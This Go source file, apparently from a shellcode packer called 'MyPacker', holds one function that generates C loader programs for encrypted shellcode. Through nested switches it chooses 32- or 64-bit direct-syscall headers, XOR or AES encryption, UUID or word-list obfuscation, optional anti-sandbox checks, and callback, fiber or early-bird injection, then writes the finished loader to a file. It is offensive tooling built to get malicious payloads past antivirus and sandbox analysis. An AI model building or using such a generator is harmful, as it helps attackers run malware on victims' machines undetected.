package Loader

import (
	"MyPacker/Converters"
	"MyPacker/Others"
	"fmt"
	"strconv"
	"strings"
)

func GenerateAndWriteTemplateToFile(options *Others.FlagOptions, EncryptShellcode string, key string, iv string, uuidString string, words string, datasetString string) string {
	fmt.Println("正在为您生成模板文件: " + options.OutFile + "." + strings.ToLower(options.Language) + "\n")
	outfile := options.OutFile
	EncryptShellcode = Converters.FormattedHexShellcode(string(EncryptShellcode))
	switch strings.ToLower(strconv.Itoa(options.Framework)) {
	case "32":
		switch strings.ToLower(options.Language) {
		case "c":
			outfile = outfile + ".c"
			switch options.Sandbox {
			case true:
				switch strings.ToLower(options.Encryption) {
				case "xor":
					switch strings.ToLower(options.Obfuscation) {
					case "uuid":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACR_OBFUSCATION", __c__uuid)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c_xor = fmt.Sprintf(__c_xor, uuidString, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c_xor, outfile)
						case "fiber":
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACR_OBFUSCATION", __c__uuid)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c_xor = fmt.Sprintf(__c_xor, uuidString, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c_xor, outfile)
						case "earlybird":
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACR_OBFUSCATION", __c__uuid)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c_xor = fmt.Sprintf(__c_xor, uuidString, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c_xor, outfile)
						}
					case "words":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACR_OBFUSCATION", __c__words)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c_xor = fmt.Sprintf(__c_xor, datasetString, words, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c_xor, outfile)
						case "fiber":
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACR_OBFUSCATION", __c__words)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c_xor = fmt.Sprintf(__c_xor, datasetString, words, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c_xor, outfile)
						case "earlybird":
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACR_OBFUSCATION", __c__words)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c_xor = fmt.Sprintf(__c_xor, datasetString, words, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c_xor, outfile)
						}
					}
				case "aes":
					switch strings.ToLower(options.Obfuscation) {
					case "uuid":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__uuid)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c__aes = fmt.Sprintf(__c__aes, uuidString, key, iv)

							//写文件
							Others.SaveTamplate2File(outfile, __c__aes, outfile)
						case "fiber":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__uuid)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c__aes = fmt.Sprintf(__c__aes, uuidString, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes, outfile)
						case "earlybird":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__uuid)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c__aes = fmt.Sprintf(__c__aes, uuidString, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes, outfile)
						}
					case "words":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__words)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c__aes = fmt.Sprintf(__c__aes, datasetString, words, key, iv)

							//写文件
							Others.SaveTamplate2File(outfile, __c__aes, outfile)
						case "fiber":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__words)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c__aes = fmt.Sprintf(__c__aes, datasetString, words, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes, outfile)
						case "earlybird":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__words)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c__aes = fmt.Sprintf(__c__aes, datasetString, words, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes, outfile)
						}
					}

				}
			default:
				switch strings.ToLower(options.Encryption) {
				case "xor":
					switch strings.ToLower(options.Obfuscation) {
					case "uuid":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACR_OBFUSCATION", __c__uuid)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_ANTI_SANDBOX", "")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c_xor = fmt.Sprintf(__c_xor, uuidString, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c_xor, outfile)
						case "fiber":
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACR_OBFUSCATION", __c__uuid)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_ANTI_SANDBOX", "")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c_xor = fmt.Sprintf(__c_xor, uuidString, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c_xor, outfile)
						case "earlybird":
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACR_OBFUSCATION", __c__uuid)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_ANTI_SANDBOX", "")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c_xor = fmt.Sprintf(__c_xor, uuidString, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c_xor, outfile)
						}
					case "words":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACR_OBFUSCATION", __c__words)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_ANTI_SANDBOX", "")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c_xor = fmt.Sprintf(__c_xor, datasetString, words, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c_xor, outfile)
						case "fiber":
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACR_OBFUSCATION", __c__words)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_ANTI_SANDBOX", "")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c_xor = fmt.Sprintf(__c_xor, datasetString, words, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c_xor, outfile)
						case "earlybird":
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACR_OBFUSCATION", __c__words)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_ANTI_SANDBOX", "")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c_xor = fmt.Sprintf(__c_xor, datasetString, words, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c_xor, outfile)
						}

					}
				case "aes":
					switch strings.ToLower(options.Obfuscation) {
					case "uuid":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__uuid)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", "")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c__aes = fmt.Sprintf(__c__aes, uuidString, key, iv)

							//写文件
							Others.SaveTamplate2File(outfile, __c__aes, outfile)
						case "fiber":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__uuid)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", "")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c__aes = fmt.Sprintf(__c__aes, uuidString, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes, outfile)
						case "earlybird":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__uuid)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", "")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c__aes = fmt.Sprintf(__c__aes, uuidString, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes, outfile)
						}
					case "words":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__words)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", "")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c__aes = fmt.Sprintf(__c__aes, datasetString, words, key, iv)

							//写文件
							Others.SaveTamplate2File(outfile, __c__aes, outfile)
						case "fiber":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__words)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", "")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c__aes = fmt.Sprintf(__c__aes, datasetString, words, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes, outfile)
						case "earlybird":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__words)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", "")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c__aes = fmt.Sprintf(__c__aes, datasetString, words, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes, outfile)
						}
					}

				}

			}

		}
	case "64":
		switch strings.ToLower(options.Language) {
		case "c":
			outfile = outfile + ".c"
			switch options.Sandbox {
			case true:
				switch strings.ToLower(options.Encryption) {
				case "xor":
					switch strings.ToLower(options.Obfuscation) {
					case "uuid":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACR_OBFUSCATION", __c__uuid)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c_xor = fmt.Sprintf(__c_xor, uuidString, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c_xor, outfile)
						case "fiber":
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACR_OBFUSCATION", __c__uuid)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c_xor = fmt.Sprintf(__c_xor, uuidString, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c_xor, outfile)
						case "earlybird":
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACR_OBFUSCATION", __c__uuid)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c_xor = fmt.Sprintf(__c_xor, uuidString, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c_xor, outfile)
						}
					case "words":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACR_OBFUSCATION", __c__words)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c_xor = fmt.Sprintf(__c_xor, datasetString, words, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c_xor, outfile)
						case "fiber":
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACR_OBFUSCATION", __c__words)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c_xor = fmt.Sprintf(__c_xor, datasetString, words, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c_xor, outfile)
						case "earlybird":
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACR_OBFUSCATION", __c__words)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c_xor = fmt.Sprintf(__c_xor, datasetString, words, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c_xor, outfile)
						}
					}
				case "aes":
					switch strings.ToLower(options.Obfuscation) {
					case "uuid":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__uuid)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c__aes = fmt.Sprintf(__c__aes, uuidString, key, iv)

							//写文件
							Others.SaveTamplate2File(outfile, __c__aes, outfile)
						case "fiber":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__uuid)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c__aes = fmt.Sprintf(__c__aes, uuidString, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes, outfile)
						case "earlybird":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__uuid)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c__aes = fmt.Sprintf(__c__aes, uuidString, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes, outfile)
						}
					case "words":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__words)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c__aes = fmt.Sprintf(__c__aes, datasetString, words, key, iv)

							//写文件
							Others.SaveTamplate2File(outfile, __c__aes, outfile)
						case "fiber":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__words)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c__aes = fmt.Sprintf(__c__aes, datasetString, words, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes, outfile)
						case "earlybird":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__words)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c__aes = fmt.Sprintf(__c__aes, datasetString, words, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes, outfile)
						}
					}

				}
			default:
				switch strings.ToLower(options.Encryption) {
				case "xor":
					switch strings.ToLower(options.Obfuscation) {
					case "uuid":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACR_OBFUSCATION", __c__uuid)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_ANTI_SANDBOX", "")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c_xor = fmt.Sprintf(__c_xor, uuidString, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c_xor, outfile)
						case "fiber":
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACR_OBFUSCATION", __c__uuid)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_ANTI_SANDBOX", "")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c_xor = fmt.Sprintf(__c_xor, uuidString, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c_xor, outfile)
						case "earlybird":
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACR_OBFUSCATION", __c__uuid)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_ANTI_SANDBOX", "")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c_xor = fmt.Sprintf(__c_xor, uuidString, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c_xor, outfile)
						}
					case "words":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACR_OBFUSCATION", __c__words)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_ANTI_SANDBOX", "")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c_xor = fmt.Sprintf(__c_xor, datasetString, words, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c_xor, outfile)
						case "fiber":
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACR_OBFUSCATION", __c__words)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_ANTI_SANDBOX", "")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c_xor = fmt.Sprintf(__c_xor, datasetString, words, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c_xor, outfile)
						case "earlybird":
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACR_OBFUSCATION", __c__words)
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_ANTI_SANDBOX", "")
							__c_xor = strings.ReplaceAll(__c_xor, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c_xor = fmt.Sprintf(__c_xor, datasetString, words, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c_xor, outfile)
						}

					}
				case "aes":
					switch strings.ToLower(options.Obfuscation) {
					case "uuid":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__uuid)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", "")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c__aes = fmt.Sprintf(__c__aes, uuidString, key, iv)

							//写文件
							Others.SaveTamplate2File(outfile, __c__aes, outfile)
						case "fiber":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__uuid)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", "")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c__aes = fmt.Sprintf(__c__aes, uuidString, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes, outfile)
						case "earlybird":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__uuid)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", "")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c__aes = fmt.Sprintf(__c__aes, uuidString, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes, outfile)
						}
					case "words":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__words)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", "")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c__aes = fmt.Sprintf(__c__aes, datasetString, words, key, iv)

							//写文件
							Others.SaveTamplate2File(outfile, __c__aes, outfile)
						case "fiber":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__words)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", "")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c__aes = fmt.Sprintf(__c__aes, datasetString, words, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes, outfile)
						case "earlybird":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__words)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", "")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c__aes = fmt.Sprintf(__c__aes, datasetString, words, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes, outfile)
						}
					}

				}

			}

		}
	}

	return outfile
}
